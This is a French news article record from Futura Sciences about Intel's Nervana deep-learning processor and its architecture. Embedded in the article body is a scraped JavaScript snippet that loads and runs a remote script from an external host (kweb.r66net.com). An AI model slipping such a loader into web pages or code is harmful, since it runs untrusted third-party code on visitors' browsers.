{"title": "Intelligence artificielle : Intel dévoile Nervana, un processeur pour l’apprentissage profond", "newspaper": "Futura Sciences", "author": "Marc Zaffagni", "date_publi": "20/10/2017", "content": "Intel vient de présenter un processeur dédié aux applications d'intelligence artificielle faisant appel à l'apprentissage profond. Le fondeur s'est associé à Facebook pour développer cette nouvelle gamme de puces spécialisées. En août 2016,  Intel  a fait l'acquisition de la jeune pousse  Nervana Systems  qui travaillait sur l'intégration des techniques d'apprentissage automatique ( machine learning ) et profond ( deep learning ) directement dans un  processeur . Un peu plus d'un an plus tard, le fondeur vient de dévoiler son premier processeur dédié aux réseaux neuronaux artificiels qui sous-tendent l'apprentissage profond. Baptisée  Nervana Neural Network Processor , cet Asic ( Application-Specific Integrated Circuit  ou  circuit intégré  spécialisé) est présenté comme le premier du genre à être commercialisé. Il sera disponible d'ici la fin de l'année.  Intel  promet que cette puce Nervana ouvrira la voie à la création d' applications  d' intelligence artificielle  (IA) entièrement nouvelles, notamment dans les domaines de la médecine, de l' automobile , des  réseaux sociaux  ou encore de la  météorologie . Le développement de Nervana s'est fait en partenariat avec Facebook qui investit beaucoup dans l' intelligence artificielle .  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Nervana est moins précis dans les calculs... et c'est mieux L'architecture de ce processeur présente trois spécificités censées optimiser le traitement du  deep learning . Tout d'abord, il n'utilise pas de  mémoire cache  physique mais une mémoire gérée par un  logiciel . Ensuite, Intel a mis au point un nouveau format  numérique  nommé Flexpoint qui offre moins de précision sur les nombres entiers et laisse passer davantage de «  bruit » dans les données . Comme l'explique Naveen Rao, vice-président du groupe produits d'intelligence artificielle et cofondateur de Nervana, les réseaux neuronaux peuvent exploiter ce bruit pour parfaire leur entraînement. La troisième spécificité de l'architecture Nervana concerne sur les interconnexions sur et autour de la puce qui sont censées produire un taux de transfert bidirectionnel très élevé. Mais  Intel  n'a fourni aucun détail précis sur les performances de ce nouveau processeur. ", "theme": "tech"}